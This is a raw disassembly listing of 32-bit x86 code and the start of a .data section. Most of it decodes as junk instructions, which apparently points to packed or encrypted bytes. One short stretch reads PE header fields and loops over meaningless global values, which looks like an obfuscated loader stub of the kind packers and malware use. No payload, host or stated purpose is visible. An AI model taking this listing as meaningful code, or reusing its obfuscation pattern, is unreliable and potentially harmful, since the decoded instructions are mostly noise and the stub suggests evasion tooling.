  41131f:	scas   eax,DWORD PTR es:[edi]
  411320:	jl     0x4113a0
  411322:	jle    0x411395
  411324:	mov    dl,0xba
  411326:	dec    edi
  411327:	fiadd  WORD PTR [edx-0x7]
  41132a:	mov    ds:0x79cbb907,al
  41132f:	fnstcw WORD PTR [ebp-0x64]
  411332:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411333:	nop
  411334:	stos   BYTE PTR es:[edi],al
  411335:	hlt    
  411336:	xchg   esp,eax
  411337:	sbb    edx,0x9354e62b
  41133d:	sbb    DWORD PTR [bp+di+0x5749],edi
  411342:	mov    esi,0xf8489716
  411347:	dec    eax
  411348:	(bad)  
  41134b:	xchg   DWORD PTR [ecx],eax
  41134d:	mov    edi,0x2e25995f
  411352:	mov    ah,0x4
  411354:	xchg   esi,eax
  411355:	sub    ebx,DWORD PTR [ebp+0x15]
  411358:	sbb    dh,BYTE PTR [edx+0x1f]
  41135b:	rcl    DWORD PTR [ecx],cl
  41135d:	mov    ebx,0x2cac4bee
  411362:	push   eax
  411363:	stc    
  411364:	sub    DWORD PTR [edx],edi
  411366:	pusha  
  411367:	int3   
  411368:	lahf   
  411369:	inc    esp
  41136a:	imul   ebp,edi,0x22
  41136d:	call   0x5e00:0x89ce632a
  411374:	and    DWORD PTR [ecx+0x3b55a9a7],edx
  41137a:	dec    edx
  41137b:	adc    al,0x9c
  41137d:	xchg   esp,eax
  41137e:	(bad)  
  41137f:	xor    DWORD PTR [edx],ecx
  411381:	inc    eax
  411382:	pop    edx
  411383:	sbb    edx,DWORD PTR [ecx-0x5867d6f7]
  411389:	rcl    BYTE PTR [edx+0x64ff320c],1
  41138f:	jb     0x41139c
  411391:	pushf  
  411392:	and    esi,DWORD PTR [eax]
  411394:	mov    ecx,0xa084f2b1
  411399:	fwait
  41139a:	push   ss
  41139b:	sub    ch,BYTE PTR [ebx+ebp*1+0x77c79269]
  4113a2:	sub    al,0xc7
  4113a4:	cmp    al,0x6c
  4113a6:	repnz cmp eax,0x9d33a740
  4113ac:	daa    
  4113ad:	jmp    0x2bfa34d9
  4113b2:	loope  0x4113d7
  4113b4:	mov    esp,0x6a501036
  4113b9:	xor    bh,ah
  4113bb:	push   esi
  4113bc:	inc    ebp
  4113bd:	xlat   BYTE PTR ds:[ebx]
  4113be:	pop    edi
  4113bf:	mov    esi,0xfce68bb4
  4113c4:	mov    bl,BYTE PTR [esi+ebp*4-0x266f1d32]
  4113cb:	(bad)  
  4113cd:	adc    eax,0x37860ffb
  4113d2:	fidivr WORD PTR [ebp-0x1dc1f781]
  4113d8:	lods   al,BYTE PTR ds:[esi]
  4113d9:	dec    ecx
  4113da:	adc    esi,esp
  4113dc:	popa   
  4113dd:	stc    
  4113de:	ins    DWORD PTR es:[edi],dx
  4113df:	repz and eax,edi
  4113e2:	mov    ah,0x76
  4113e4:	pop    esp
  4113e5:	jp     0x411430
  4113e7:	pushf  
  4113e8:	loop   0x411430
  4113ea:	sbb    eax,0xd94d5688
  4113ef:	xchg   ebx,eax
  4113f0:	dec    eax
  4113f1:	and    BYTE PTR [eax+0x3e],dh
  4113f4:	(bad)  
  4113f5:	dec    esp
  4113f6:	pop    eax
  4113f7:	or     al,0x82
  4113f9:	fisub  WORD PTR [eax]
  4113fb:	out    dx,al
  4113fc:	dec    esi
  4113fd:	mov    WORD PTR [esi],ss
  4113ff:	pop    ecx
  411400:	popf   
  411401:	xchg   ecx,eax
  411402:	jg     0x41138c
  411404:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411405:	cmp    edx,DWORD PTR [ecx]
  411407:	frstor [ebp+0x68]
  41140a:	nop
  41140b:	cdq    
  41140c:	fwait
  41140d:	xor    al,0x48
  41140f:	sti    
  411410:	punpcklwd mm0,DWORD PTR [eax-0x57]
  411414:	aas    
  411415:	jns    0x41143b
  411417:	leave  
  411418:	pop    esi
  411419:	ror    DWORD PTR ss:[edi-0x1eeb51cf],1
  411420:	adc    ch,BYTE PTR [ebp+0x4e]
  411423:	inc    esi
  411424:	or     eax,DWORD PTR [edi-0x32c950a4]
  41142a:	(bad)  
  41142b:	fxch   st(6)
  41142d:	into   
  41142e:	mov    dh,bl
  411430:	adc    DWORD PTR [edx],esi
  411432:	inc    eax
  411433:	mov    edx,0x894fe4b5
  411438:	out    dx,eax
  411439:	aas    
  41143a:	stos   BYTE PTR es:[edi],al
  41143b:	shl    DWORD PTR [eax],0x5
  41143e:	loop   0x4113ca
  411440:	add    al,0x97
  411442:	sub    eax,0x232df2fe
  411447:	enter  0xed2a,0x0
  41144b:	pop    eax
  41144c:	rol    DWORD PTR [ebp+0x4a67f088],1
  411452:	test   DWORD PTR ds:[esi-0x3d854c97],eax
  411459:	mov    es,eax
  41145b:	in     al,0x91
  41145d:	jmp    0x7936036
  411462:	pop    edx
  411463:	mov    edx,0x7d300e4
  411468:	inc    ecx
  411469:	rcr    DWORD PTR [si+0x713d],0x99
  41146f:	mov    ch,bh
  411471:	addr16 ret 0x617a
  411475:	jl     0x411458
  411477:	arpl   WORD PTR [esi+0x65],cx
  41147a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41147b:	lea    ebp,[edi]
  41147d:	iret   
  41147e:	jecxz  0x4114f3
  411480:	dec    esi
  411481:	cmp    BYTE PTR [ebp+0x551481e3],0xa7
  411488:	push   ss
  411489:	inc    ebx
  41148a:	js     0x41143c
  41148c:	(bad)  
  41148d:	jnp    0x411439
  41148f:	shr    BYTE PTR [edi],0x48
  411492:	test   BYTE PTR [esi+eax*2-0x3d1ccc01],dl
  411499:	leave  
  41149a:	inc    edi
  41149b:	push   ss
  41149c:	dec    ecx
  41149d:	and    al,BYTE PTR [ebp+0x15bdced8]
  4114a3:	scas   eax,DWORD PTR es:[edi]
  4114a4:	sbb    eax,esi
  4114a6:	push   ecx
  4114a7:	mov    ebx,0xc1b2e3fb
  4114ac:	push   ebx
  4114ad:	jae    0x411493
  4114af:	lea    esi,[edi-0x755a5dd2]
  4114b5:	jl     0x4114ab
  4114b7:	xchg   ebx,eax
  4114b8:	cmp    eax,edi
  4114ba:	jno    0x411480
  4114bc:	int    0xa8
  4114be:	ss mov cl,0x17
  4114c1:	jmp    0x41147a
  4114c3:	bound  esp,QWORD PTR [ecx+0x72d0d2ed]
  4114c9:	ds addr16 out 0x29,eax
  4114cd:	mov    bl,0x8b
  4114cf:	push   eax
  4114d0:	gs jns 0x411497
  4114d3:	retf   0x6c28
  4114d6:	and    DWORD PTR [edx+0x44626913],0x21
  4114dd:	das    
  4114de:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4114e0:	push   ss
  4114e1:	rol    edx,0xcd
  4114e4:	jp     0x411490
  4114e6:	mov    ds:0x333085f0,eax
  4114eb:	adc    DWORD PTR [ebx+0xd],esp
  4114ee:	inc    eax
  4114ef:	mov    al,0x19
  4114f2:	sti    
  4114f3:	lods   al,BYTE PTR ds:[esi]
  4114f4:	jo     0x41153c
  4114f6:	xchg   ebx,eax
  4114f7:	fld    DWORD PTR [eax+0x1c9b53ba]
  4114fd:	int    0xd5
  4114ff:	or     eax,esp
  411501:	xor    al,0x21
  411503:	jbe    0x411515
  411505:	je     0x41148d
  411507:	xchg   ecx,eax
  411508:	pop    eax
  411509:	ret    
  41150a:	fldenv [eax+0x130a1d4]
  411510:	shl    bl,0x6b
  411513:	sub    BYTE PTR [eax-0x3714ccb3],ah
  411519:	xor    BYTE PTR [esi],bl
  41151b:	sub    BYTE PTR [ebp+0x24736bfc],ch
  411521:	pop    ecx
  411522:	imul   ebx,DWORD PTR [edi],0x27df0859
  411528:	mov    dh,0x1e
  41152a:	mov    esi,esp
  41152c:	ss xor eax,0xcffd8469
  411532:	iret   
  411533:	or     dl,BYTE PTR [ebx+0x73f20aae]
  411539:	push   eax
  41153a:	data16 mov dl,BYTE PTR [ebp+esi*1+0x41]
  41153f:	mov    ecx,DWORD PTR [ebp+0x35]
  411542:	mov    eax,ds:0x68a6496
  411547:	ss loopne 0x411538
  41154a:	out    0x8b,al
  41154c:	sub    dl,bl
  41154e:	jp     0x411560
  411550:	cli    
  411551:	mov    eax,0x7e9fff82
  411556:	or     BYTE PTR [eax],cl
  411558:	pop    ecx
  411559:	dec    edx
  41155a:	fcmovnbe st,st(1)
  41155c:	or     ch,BYTE PTR [ebx-0x370669fb]
  411562:	in     al,dx
  411563:	jge    0x41154b
  411565:	repz adc ecx,esp
  411568:	or     DWORD PTR [esi+ebx*2+0x5867ad8b],ebp
  41156f:	imul   ebx,DWORD PTR [ebx-0x2594a808],0x121931e1
  411579:	or     ah,BYTE PTR [ecx-0x5]
  41157c:	push   es
  41157d:	mov    eax,0x94d8fbd8
  411582:	inc    BYTE PTR [esi]
  411584:	dec    esi
  411585:	cmc    
  411586:	test   eax,0xfab5f3ea
  41158b:	loopne 0x41152c
  41158d:	ja     0x4115b3
  41158f:	mov    edi,0xa1373ad2
  411594:	adc    esi,0xab392bc
  41159a:	inc    edi
  41159b:	push   eax
  41159c:	cmp    BYTE PTR [eax-0x59],cl
  41159f:	(bad)
  4115a2:	xchg   esp,eax
  4115a3:	cmp    bl,BYTE PTR [ebx+0x6b]
  4115a6:	push   edx
  4115a7:	dec    esp
  4115a8:	out    dx,al
  4115a9:	add    edi,eax
  4115ab:	mov    dh,0x35
  4115ad:	xchg   ebp,eax
  4115ae:	sub    BYTE PTR [eax-0x42c2aedb],ah
  4115b4:	ins    DWORD PTR es:[edi],dx
  4115b5:	sub    dh,0xec
  4115b8:	out    0x7,al
  4115ba:	mov    bh,0xb9
  4115bc:	test   BYTE PTR [eax],bh
  4115be:	aaa    
  4115bf:	mov    al,0x5e
  4115c1:	shr    BYTE PTR [ebp+0x18],0xae
  4115c5:	int3   
  4115c6:	inc    esp
  4115c7:	xchg   esi,eax
  4115c8:	jae    0x41157a
  4115ca:	sbb    ecx,esp
  4115cc:	(bad)  
  4115cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4115ce:	or     DWORD PTR [edi+0x18],esi
  4115d1:	(bad)  
  4115d2:	xor    BYTE PTR [esi-0x75],dh
  4115d5:	push   ebp
  4115d6:	or     BYTE PTR [ebx],dh
  4115d8:	ror    DWORD PTR [ebp+0x729b1084],0x32
  4115df:	add    BYTE PTR [ecx+0x45ff0845],cl
  4115e5:	or     al,0xe9
  4115e7:	sti    
  4115e8:	stc    
  4115e9:	(bad)  
  4115ea:	dec    DWORD PTR [ebx-0x3ecc0fbb]
  4115f0:	mov    ecx,DWORD PTR [ebp+0x10]
  4115f3:	add    eax,esi
  4115f5:	mov    DWORD PTR [ecx],eax
  4115f7:	pop    esi
  4115f8:	leave  
  4115f9:	ret    0xc
  4115fc:	push   ebp
  4115fd:	mov    ebp,esp
  4115ff:	push   ecx
  411600:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  411607:	jmp    0x4117ce
  41160c:	mov    eax,ds:0x7129745c
  411611:	xor    DWORD PTR [ecx+0x74],esp
  411614:	in     eax,0xeb
  411616:	leave  
  411617:	outs   dx,DWORD PTR ds:[esi]
  411618:	xor    edi,DWORD PTR [ebx]
  41161a:	mov    WORD PTR [eax-0x7a],fs
  41161d:	inc    eax
  41161e:	jle    0x41169e
  411620:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411621:	jg     0x4116a1
  411623:	jle    0x41161a
  411625:	or     al,0xdd
  411627:	inc    ecx
  411628:	or     BYTE PTR [ebp+0x2f],bl
  41162b:	xor    eax,0x7af5d817
  411630:	outs   dx,BYTE PTR ds:[esi]
  411631:	cmp    eax,ebp
  411633:	and    al,0x87
  411635:	or     BYTE PTR [edi-0x39],dl
  411638:	imul   BYTE PTR [ebp+0x70]
  41163b:	les    edx,FWORD PTR [eiz*2+0x784e9e5]
  411642:	inc    esi
  411643:	imul   ecx,eax,0xa14e514e
  411649:	imul   ebp,esi,0x3b
  41164c:	mov    ds:0xe1d3cbfb,eax
  411651:	pop    ss
  411652:	and    bh,BYTE PTR [eax+ebx*1]
  411655:	sti    
  411656:	push   esp
  411657:	std    
  411658:	jno    0x411604
  41165a:	(bad)  
  41165b:	cmp    bl,0xf1
  41165e:	dec    ebp
  41165f:	cs hlt 
  411661:	jne    0x411629
  411663:	xchg   al,ah
  411665:	mov    esp,0x874aed85
  41166a:	xchg   edi,eax
  41166b:	out    dx,eax
  41166c:	out    0xd3,eax
  41166e:	fnstsw WORD PTR [eax]
  411670:	mov    ch,0xee
  411672:	push   cs
  411673:	pop    ebp
  411674:	adc    cl,BYTE PTR [edx+0x14196db3]
  41167a:	shl    DWORD PTR [ebp+edi*8-0x31],0x9a
  41167f:	xchg   esi,eax
  411680:	pop    eax
  411681:	outs   dx,BYTE PTR ds:[esi]
  411682:	cwde   
  411683:	or     bh,BYTE PTR [esp+ebp*2+0x6d]
  411687:	dec    eax
  411688:	sbb    bl,BYTE PTR [edx+eiz*2]
  41168b:	mov    ds:0xdee83166,al
  411690:	cdq    
  411691:	retf   
  411692:	mov    ebp,0x87579f0e
  411697:	loopne 0x4116ff
  411699:	dec    edi
  41169a:	mov    eax,ds:0xef97678c
  41169f:	inc    esp
  4116a0:	dec    esi
  4116a1:	mov    esp,DWORD PTR [esi]
  4116a3:	mov    eax,ds:0x88a4bf79
  4116a8:	call   0xcc0391d2
  4116ad:	jp     0x41167c
  4116af:	dec    edx
  4116b0:	mov    ?,WORD PTR [ebx+eax*2+0x2a]
  4116b4:	repnz enter 0x7647,0xe4
  4116b9:	and    ebx,esi
  4116bb:	or     DWORD PTR [esi-0x54],esi
  4116be:	hlt    
  4116bf:	out    0x48,al
  4116c1:	(bad)  
  4116c2:	add    ch,cl
  4116c4:	loop   0x4116d5
  4116c6:	cmp    eax,0xcab8f66c
  4116cb:	rcl    DWORD PTR [esi-0x41],1
  4116ce:	xchg   esp,eax
  4116cf:	adc    DWORD PTR [ebp-0x4f],ebp
  4116d2:	xchg   esi,eax
  4116d3:	cli    
  4116d4:	in     al,dx
  4116d5:	out    dx,eax
  4116d6:	dec    eax
  4116d7:	inc    ebp
  4116d8:	enter  0x6452,0x2e
  4116dc:	xchg   edi,eax
  4116de:	jns    0x411702
  4116e0:	nop
  4116e1:	cmp    eax,0xe449d
  4116e6:	lea    eax,[edi+0x5b6b89a3]
  4116ec:	mov    dl,BYTE PTR [eax+0x4]
  4116ef:	mov    ds:0x2f600acf,eax
  4116f4:	mov    ss,WORD PTR [eax+0x53]
  4116f7:	adc    esi,DWORD PTR [edx-0x5da96545]
  4116fd:	mov    WORD PTR ds:0xf6c83231,?
  411703:	sbb    al,0xd6
  411705:	imul   esp,DWORD PTR [ecx+esi*1-0x6f],0x202de7e9
  41170d:	fisub  DWORD PTR [ecx]
  41170f:	dec    edi
  411710:	sub    BYTE PTR [edx+0x4e68d3eb],dl
  411716:	jge    0x4116e4
  411718:	xchg   esi,eax
  411719:	leave  
  41171a:	adc    eax,0xdbd1db02
  41171f:	dec    ebp
  411720:	(bad)
  411724:	mov    ds:0x8e16a3dc,eax
  411729:	jno    0x411748
  41172b:	mov    cl,0x82
  41172d:	pushf  
  41172e:	dec    ecx
  41172f:	jecxz  0x4117b0
  411731:	xor    ebp,DWORD PTR [edx+ecx*1-0x5c]
  411735:	lock push ss
  411737:	rol    BYTE PTR [ebx+0x59],1
  41173a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41173b:	inc    ebx
  41173c:	mov    bh,0xf
  41173e:	mov    ds:0xcf3b5d5f,al
  411743:	sti    
  411744:	ins    BYTE PTR es:[edi],dx
  411745:	ja     0x41173c
  411747:	fcom   QWORD PTR [edi+0x27]
  41174b:	pop    ss
  41174c:	xor    edx,DWORD PTR [ebp+0x5b4a2e5e]
  411752:	mov    dh,0x41
  411754:	jge    0x411770
  411756:	mov    al,ds:0xdfc79c86
  41175b:	mov    dl,0xf
  41175d:	or     esi,eax
  41175f:	fwait
  411760:	in     al,0x1a
  411762:	cmp    esp,edi
  411764:	mov    BYTE PTR [ecx-0x265eb772],bl
  41176a:	pop    ebp
  41176b:	retf   
  41176c:	pop    esi
  41176d:	add    BYTE PTR [edx+0x576ead5e],0xc3
  411774:	xor    al,BYTE PTR [ebx+0x47]
  411777:	cmp    DWORD PTR [ecx],esp
  411779:	jne    0x4117ce
  41177b:	(bad)  
  41177e:	xor    DWORD PTR [eax],ecx
  411780:	xchg   ecx,eax
  411781:	call   0x1d3b9ca
  411786:	loope  0x4117b5
  411788:	(bad)  [ebx]
  41178a:	mov    cl,0x6b
  41178c:	bound  ebx,QWORD PTR [eax]
  41178e:	xchg   esi,eax
  41178f:	inc    eax
  411790:	in     al,dx
  411791:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411792:	ss dec ebx
  411794:	inc    ecx
  411795:	xlat   BYTE PTR ds:[ebx]
  411796:	cmp    edi,DWORD PTR [edx-0x394dbe46]
  41179c:	retf   0x8937
  41179f:	(bad)  
  4117a1:	dec    esi
  4117a2:	sbb    ah,bl
  4117a4:	clc    
  4117a5:	in     eax,0x32
  4117a7:	jle    0x4117ff
  4117a9:	pop    ebx
  4117aa:	xlat   BYTE PTR ds:[ebx]
  4117ab:	fcom   QWORD PTR [edi+0x4c]
  4117ae:	mov    dl,0x26
  4117b0:	adc    edx,edx
  4117b2:	shl    BYTE PTR [edi+0x44989378],cl
  4117b8:	(bad)  
  4117b9:	in     al,dx
  4117ba:	lahf   
  4117bb:	outs   dx,DWORD PTR ds:[esi]
  4117bc:	popf   
  4117bd:	mov    bh,0x76
  4117bf:	mov    DWORD PTR [edi-0x7e],edx
  4117c2:	pop    ss
  4117c3:	push   0x1be00089
  4117c8:	push   ds
  4117c9:	call   0x458b:0xf9e60b4a
  4117d0:	or     bh,al
  4117d2:	add    eax,0x4336a3
  4117d7:	cmp    eax,0x8a000042
  4117dc:	add    BYTE PTR [ecx+0x4335ff2d],al
  4117e2:	add    BYTE PTR [ebp+0x6d],bh
  4117e5:	add    BYTE PTR [eax],al
  4117e7:	add    al,0x38
  4117e9:	xor    DWORD PTR ds:0x43369f,0x433603
  4117f3:	xor    al,0x46
  4117f5:	mov    DWORD PTR ds:0x43369f,0x735a
  4117ff:	cmp    al,0xc3
  411801:	jne    0x411aa4
  411807:	and    edx,0x7ba3
  41180d:	mov    eax,DWORD PTR [ebp+0x8]
  411810:	mov    ecx,DWORD PTR [ebp+0x8]
  411813:	add    ecx,DWORD PTR [eax+0x3c]
  411816:	and    DWORD PTR ds:0x43361b,0x4b8b
  411820:	mov    edx,0x7510854
  411825:	and    DWORD PTR ds:0x4336ab,0x0
  41182f:	mov    eax,ds:0x4336ab
  411834:	inc    eax
  411835:	mov    ds:0x4336ab,eax
  41183a:	cmp    DWORD PTR ds:0x4336ab,0xb
  411841:	jne    0x411887
  411847:	push   0x4337bc
  41184c:	push   0x761c
  411851:	push   0x2832
  411856:	push   0x3f0d
  41185b:	push   0x4923
  411860:	push   DWORD PTR [ebp-0x24]
  411863:	push   DWORD PTR [ebp-0x28]
  411866:	push   DWORD PTR [ebp-0xc]
  411869:	push   0x49e1
  41186e:	push   DWORD PTR [ebp-0x28]
  411871:	push   DWORD PTR [ebp-0x14]
  411874:	push   DWORD PTR [ebp-0x10]
  411877:	push   0x6b07
  41187c:	push   0x8d34
  411881:	call   DWORD PTR ds:0x4122b8
  411887:	cmp    DWORD PTR ds:0x4336ab,0xa
  41188e:	jne    0x41189f
  411894:	mov    eax,ds:0x4336ab
  411899:	inc    eax
  41189a:	mov    ds:0x4336ab,eax
  41189f:	cmp    DWORD PTR ds:0x4336ab,0x11
  4118a6:	jb     0x41182f
  4118ac:	mov    DWORD PTR [ebp+0x8],ecx
  4118af:	mov    eax,DWORD PTR [ebp-0x4]
  4118b2:	xor    eax,edx
  4118b4:	push   esi
  4118b5:	mov    esi,DWORD PTR [ebp+0x8]
  4118b8:	mov    ecx,0x32729b
  4118bd:	add    eax,ecx
  4118bf:	cmp    DWORD PTR [esi+0x54],eax
  4118c2:	pop    esi
  4118c3:	je     0x4118d1
  4118c9:	mov    eax,DWORD PTR [ebp+0x8]
  4118cc:	jmp    0x411ab1
  4118d1:	mov    eax,DWORD PTR [ebp-0x4]
  4118d4:	xor    eax,edx
  4118d6:	jmp    0x411a9d
  4118db:	mov    ebp,0xe1e4219a
  4118e0:	gs mov ecx,0x58658ca3
  4118e6:	stos   DWORD PTR es:[edi],eax
  4118e7:	and    BYTE PTR [ebx+0x4e2c0b2b],ch
  4118ed:	jle    0x41196d
  4118ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4118f0:	jg     0x411970
  4118f2:	jle    0x411962
  4118f4:	push   es
  4118f5:	dec    edi
  4118f6:	adc    al,0x40
  4118f8:	adc    DWORD PTR [ebp*1-0x58e3ffb1],esi
  4118ff:	push   edx
  411900:	xchg   ebp,eax
  411901:	mov    eax,0x78339dc3
  411906:	ret    0xfd2
  411909:	in     al,0xca
  41190b:	inc    eax
  41190c:	sbb    DWORD PTR [ecx-0x5a],ebx
  41190f:	xlat   BYTE PTR ds:[ebx]
  411910:	mov    dl,0xa4
  411912:	inc    BYTE PTR [ecx-0x4a]
  411915:	mov    dh,0x82
  411917:	mov    edi,0xb5d86aef
  41191c:	or     BYTE PTR [edx-0x61f49bd0],ch
  411922:	loop   0x41195d
  411924:	cli    
  411925:	retf   0xadb7
  411928:	cwde   
  411929:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41192a:	xchg   edx,eax
  41192b:	sbb    ch,BYTE PTR [edi+ebx*8-0x61]
  41192f:	xor    al,0x6e
  411931:	not    ch
  411933:	(bad)  
  411934:	pop    esi
  411935:	popa   
  411936:	cwde   
  411937:	push   esp
  411938:	sti    
  411939:	jno    0x411955
  41193b:	jb     0x4118f0
  41193d:	push   eax
  41193e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41193f:	dec    ecx
  411940:	xchg   BYTE PTR [ecx],bh
  411942:	mov    ecx,0x7d06f47b
  411947:	xor    DWORD PTR [esi*8-0x33473c9c],ecx
  41194e:	mov    esp,?
  411950:	stc    
  411951:	xchg   DWORD PTR [esi+0x70],edx
  411954:	lahf   
  411955:	and    BYTE PTR [edx],cl
  411957:	jmp    0x6bb8c3c1
  41195c:	jmp    FWORD PTR [edx-0x22]
  41195f:	inc    eax
  411960:	push   ss
  411961:	push   es
  411962:	cld    
  411963:	push   edx
  411964:	mov    al,ds:0x2d146d6a
  411969:	int    0x18
  41196b:	cdq    
  41196c:	pop    esi
  41196d:	pop    es
  41196e:	push   ds
  41196f:	call   0xd985:0x909c2f7
  411976:	repz gs mov cl,0x38
  41197a:	into   
  41197b:	xor    DWORD PTR [ebx+0x3b],edx
  41197e:	lahf   
  41197f:	fisttp DWORD PTR [ebx]
  411981:	shr    DWORD PTR [ebx+0x4811ad0d],1
  411987:	fnsave [edx+0x76]
  41198a:	dec    esi
  41198b:	and    edi,DWORD PTR [ebp+0x3dcefcb]
  411991:	xchg   ecx,eax
  411992:	sbb    al,0x82
  411994:	sub    al,0xc2
  411996:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411997:	xlat   BYTE PTR ds:[ebx]
  411998:	push   ebx
  411999:	call   0x9a40:0xc300f8db
  4119a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4119a1:	inc    esp
  4119a2:	mov    BYTE PTR [ebp+0x187a5158],ch
  4119a8:	out    0xba,al
  4119aa:	inc    edi
  4119ab:	mov    al,ds:0x28e96744
  4119b0:	outs   dx,BYTE PTR ds:[esi]
  4119b1:	mov    ebx,ss
  4119b3:	push   ds
  4119b4:	adc    DWORD PTR [edi+0x13],ecx
  4119b7:	mov    al,0xf2
  4119b9:	jo     0x41198f
  4119bb:	call   0xe726bec9
  4119c0:	jg     0x41199a
  4119c2:	mov    dh,0x1f
  4119c4:	xor    bh,dh
  4119c6:	pop    ebx
  4119c7:	enter  0xed7d,0x31
  4119cb:	jb     0x411959
  4119cd:	and    BYTE PTR [ebx-0x6d5d4649],0x6a
  4119d4:	or     DWORD PTR ds:0x63f998ed,0x29
  4119db:	dec    eax
  4119dc:	dec    ebx
  4119dd:	(bad)  
  4119de:	iret   
  4119df:	rcr    DWORD PTR [eax-0x17],cl
  4119e2:	mov    ah,0x27
  4119e4:	mov    eax,DWORD PTR [edx+edi*1+0x612afc6e]
  4119eb:	clc    
  4119ec:	jne    0x4119c6
  4119ee:	and    bh,ch
  4119f0:	dec    eax
  4119f1:	dec    edi
  4119f2:	mov    eax,0xdb8301ef
  4119f7:	adc    DWORD PTR [ebx],esp
  4119f9:	repnz push ds
  4119fb:	scas   eax,DWORD PTR es:[edi]
  4119fc:	lahf   
  4119fd:	push   esp
  4119fe:	xchg   esp,eax
  4119ff:	or     edi,DWORD PTR [ebp-0x1b]
  411a02:	jo     0x411a45
  411a04:	cdq    
  411a05:	lds    ecx,FWORD PTR [edx+eiz*4]
  411a08:	jmp    0x411a60
  411a0a:	xor    dl,BYTE PTR [edx]
  411a0c:	push   ds
  411a0d:	sbb    ebp,ebx
  411a0f:	lods   al,BYTE PTR ds:[esi]
  411a10:	mov    ah,0xfc
  411a12:	test   DWORD PTR [edx*8-0x42be4d73],edx
  411a19:	stc    
  411a1a:	cld    
  411a1b:	mov    es,WORD PTR [eax+eiz*2]
  411a1e:	adc    DWORD PTR [edx-0x16d81cc5],esp
  411a24:	pushf  
  411a25:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411a26:	dec    esi
  411a27:	aaa    
  411a28:	mov    ch,BYTE PTR [ebx-0x23990618]
  411a2e:	mov    ebx,gs
  411a30:	xchg   edx,eax
  411a31:	mov    eax,0x65bf009
  411a36:	js     0x4119d0
  411a38:	ret    
  411a39:	push   ecx
  411a3a:	rcr    bl,1
  411a3c:	push   es
  411a3d:	cmp    al,0xdd
  411a3f:	icebp  
  411a40:	retf   0x8af3
  411a43:	sbb    esi,DWORD PTR [ebp+0x37adf72]
  411a49:	mov    al,ds:0xfee10383
  411a4e:	sub    al,0x89
  411a50:	and    ecx,DWORD PTR [edx-0x345d6f8a]
  411a56:	repnz dec esp
  411a58:	dec    ecx
  411a59:	out    0x3a,al
  411a5b:	test   DWORD PTR [edi-0x2290c574],0x71fa7071
  411a65:	test   eax,0x9a80f62a
  411a6a:	cld    
  411a6b:	(bad)  
  411a6c:	pushf  
  411a6d:	inc    eax
  411a6e:	pop    DWORD PTR [edi+0x7145fe8]
  411a74:	les    ecx,FWORD PTR [edx-0x20]
  411a77:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411a78:	outs   dx,BYTE PTR ds:[esi]
  411a79:	xchg   esi,eax
  411a7a:	in     eax,0x85
  411a7c:	jecxz  0x411a05
  411a7e:	out    dx,al
  411a7f:	mov    ds:0xc41ebe39,al
  411a84:	push   ecx
  411a85:	lock adc eax,DWORD PTR [ebp+0x62]
  411a89:	shl    DWORD PTR [edx],0xab
  411a8c:	adc    eax,0x1add7836
  411a91:	jnp    0x411af3
  411a93:	and    ebp,DWORD PTR [ecx+0x43731537]
  411a99:	sub    eax,DWORD PTR [ebx]
  411a9b:	call   0xea021e47
  411aa0:	or     eax,0x8b000000
  411aa5:	inc    ebp
  411aa6:	cld    
  411aa7:	xor    eax,0x7510854
  411aac:	add    eax,0x32729b
  411ab1:	leave  
  411ab2:	ret    0x4

Disassembly of section .data:

00412000 <.data>:
  412000:	sub    al,0x29
  412002:	add    DWORD PTR [eax],eax
  412004:	sub    DWORD PTR ss:[ecx],eax
  412007:	add    BYTE PTR [eax+0x29],al
  41200a:	add    DWORD PTR [eax],eax
  41200c:	dec    esi
  41200d:	sub    DWORD PTR [ecx],eax
  41200f:	add    BYTE PTR [eax+0x29],bl
  412012:	add    DWORD PTR [eax],eax
  412014:	bound  ebp,QWORD PTR [ecx]
  412016:	add    DWORD PTR [eax],eax
  412018:	ins    BYTE PTR es:[edi],dx
  412019:	sub    DWORD PTR [ecx],eax
  41201b:	add    BYTE PTR [esi+0x29],dh
  41201e:	add    DWORD PTR [eax],eax
  412020:	mov    BYTE PTR [ecx],ch
  412022:	add    DWORD PTR [eax],eax
  412024:	xchg   edx,eax
  412025:	sub    DWORD PTR [ecx],eax
  412027:	add    BYTE PTR [edx-0x5dfffed7],bl
  41202d:	sub    DWORD PTR [ecx],eax
  41202f:	add    BYTE PTR [esi-0x43fffed7],ch
  412035:	sub    DWORD PTR [ecx],eax
  412037:	add    dh,al
  412039:	sub    DWORD PTR [ecx],eax
  41203b:	add    dl,dl
  41203d:	sub    DWORD PTR [ecx],eax
  41203f:	add    ah,bl
  412041:	sub    DWORD PTR [ecx],eax
  412043:	add    ah,ch
  412045:	sub    DWORD PTR [ecx],eax
  412047:	add    ah,dh
  412049:	sub    DWORD PTR [ecx],eax
  41204b:	add    ah,bh
  41204d:	sub    DWORD PTR [ecx],eax
  41204f:	add    BYTE PTR [esi],al
  412051:	sub    al,BYTE PTR [ecx]
  412053:	add    BYTE PTR [edx],dl
  412055:	sub    al,BYTE PTR [ecx]
  412057:	add    BYTE PTR [esi],bl
  412059:	sub    al,BYTE PTR [ecx]
  41205b:	add    BYTE PTR [edx+ebp*1],ch
  41205e:	add    DWORD PTR [eax],eax
  412060:	sub    al,BYTE PTR ss:[ecx]
  412063:	add    BYTE PTR [edx+0x2a],al
  412066:	add    DWORD PTR [eax],eax
  412068:	dec    esp
  412069:	sub    al,BYTE PTR [ecx]
  41206b:	add    BYTE PTR [esi+0x2a],dl
  41206e:	add    DWORD PTR [eax],eax
  412070:	sub    al,BYTE PTR fs:[ecx]
  412073:	add    BYTE PTR [eax+0x2a],dh
  412076:	add    DWORD PTR [eax],eax
  412078:	js     0x4120a4
